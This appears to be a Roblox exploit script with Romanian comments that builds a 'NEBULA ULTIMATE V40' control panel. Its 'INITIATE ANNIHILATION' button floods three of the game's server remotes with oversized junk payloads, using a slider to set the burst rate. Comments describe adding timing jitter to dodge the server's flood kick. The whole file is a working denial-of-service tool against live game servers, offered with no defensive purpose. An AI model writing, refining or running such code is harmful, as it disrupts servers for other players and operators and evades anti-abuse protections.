local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local isActive = false
local power = 400 

-- ========== TARGETE CRITICE ==========
local targets = {
    ReplicatedStorage:FindFirstChild("Packages/Synchronizer/RequestData", true),
    ReplicatedStorage:FindFirstChild("RF/ValentinesShopService/SearchUser", true),
    ReplicatedStorage:FindFirstChild("RE/PlotService/CashCollected", true)
}

-- ========== STATIC PAYLOAD (OPTIMIZARE RAM) ==========
-- Generăm tabelul o singură dată la început pentru a evita supraîncărcarea memoriei (Garbage Collection)
local STATIC_VOID_PAYLOAD = {}
for i = 1, 10 do
    STATIC_VOID_PAYLOAD[HttpService:GenerateGUID(false):sub(1,6)] = {
        ["Data"] = string.rep("💣", 150),
        ["Math"] = { [i] = math.huge },
        ["Static"] = true
    }
end

-- ========== INTERFAȚĂ GONZO V40 ==========
local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
local Main = Instance.new("Frame", ScreenGui)
Main.Size, Main.Position = UDim2.new(0, 340, 0, 480), UDim2.new(0.5, -170, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(10, 0, 15)
Main.Active = true -- Draggable modern implementat mai jos

-- Dragging System (Înlocuiește proprietatea Draggable depreciată)
local dragStart, startPos, dragging
Main.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true dragStart = i.Position startPos = Main.Position end end)
UserInputService.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then local delta = i.Position - dragStart Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)

Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 15)
local Glow = Instance.new("UIStroke", Main)
Glow.Color, Glow.Thickness = Color3.fromRGB(180, 0, 255), 2

local Title = Instance.new("TextLabel", Main)
Title.Size, Title.Text = UDim2.new(1, 0, 0, 50), "NEBULA ULTIMATE V40"
Title.TextColor3, Title.Font = Color3.fromRGB(220, 100, 255), Enum.Font.GothamBlack
Title.BackgroundTransparency, Title.TextSize = 1, 18

local function CreateSlider(name, pos, minVal, maxVal, default)
    local Label = Instance.new("TextLabel", Main)
    Label.Size, Label.Position = UDim2.new(1, 0, 0, 25), pos
    Label.Text, Label.TextColor3, Label.BackgroundTransparency = name..": "..default, Color3.new(1,1,1), 1
    local Bar = Instance.new("Frame", Main)
    Bar.Size, Bar.Position = UDim2.new(0.8, 0, 0, 4), pos + UDim2.new(0.1, 0, 0, 25)
    Bar.BackgroundColor3 = Color3.fromRGB(40, 0, 70)
    local Knob = Instance.new("TextButton", Bar)
    Knob.Size, Knob.Position = UDim2.new(0, 16, 0, 16), UDim2.new((default-minVal)/(maxVal-minVal), -8, 0.5, -8)
    Knob.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
    Knob.Text = ""
    Instance.new("UICorner", Knob)
    Knob.MouseButton1Down:Connect(function()
        local move; move = RunService.RenderStepped:Connect(function()
            local p = math.clamp((player:GetMouse().X - Bar.AbsolutePosition.X) / Bar.AbsoluteSize.X, 0, 1)
            Knob.Position = UDim2.new(p, -8, 0.5, -8)
            power = math.floor(minVal + (p * (maxVal - minVal)))
            Label.Text = name .. ": " .. power
        end)
        UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then move:Disconnect() end end)
    end)
end
CreateSlider("STORM PRESSURE", UDim2.new(0, 0, 0.2, 0), 1, 2000, 400)

local ActionBtn = Instance.new("TextButton", Main)
ActionBtn.Size, ActionBtn.Position = UDim2.new(0.8, 0, 0, 60), UDim2.new(0.1, 0, 0.5, 0)
ActionBtn.Text, ActionBtn.BackgroundColor3 = "INITIATE ANNIHILATION", Color3.fromRGB(100, 0, 200)
ActionBtn.TextColor3, ActionBtn.Font = Color3.new(1, 1, 1), Enum.Font.GothamBlack
Instance.new("UICorner", ActionBtn)

local AbortBtn = Instance.new("TextButton", Main)
AbortBtn.Size, AbortBtn.Position = UDim2.new(0.8, 0, 0, 50), UDim2.new(0.1, 0, 0.7, 0)
AbortBtn.Text, AbortBtn.BackgroundColor3 = "ABORT / CLEANUP", Color3.fromRGB(150, 0, 0)
AbortBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", AbortBtn)

-- ========== MOTOR OPTIMIZAT ==========
ActionBtn.MouseButton1Click:Connect(function()
    if isActive then return end
    isActive = true
    ActionBtn.Text = "SYSTEM OVERLOAD..."
    ActionBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 100)
    
    task.spawn(function()
        while isActive do
            for _, r in pairs(targets) do
                if r and isActive then
                    -- Folosim task.defer pentru pachete asincrone fără lag FPS
                    task.defer(function()
                        pcall(function()
                            -- Trimitere în rafală bazată pe power
                            for i = 1, math.clamp(power / 10, 1, 200) do
                                r:FireServer(STATIC_VOID_PAYLOAD)
                            end
                        end)
                    end)
                end
            end
            
            -- Sincronizare rețea pentru a preveni kick-ul instantaneu (Inbound Flood)
            RunService.Heartbeat:Wait()
            if math.random() > 0.8 then task.wait(0.05) end
        end
    end)
end)

AbortBtn.MouseButton1Click:Connect(function()
    isActive = false
    ActionBtn.Text = "INITIATE ANNIHILATION"
    ActionBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 200)
end)
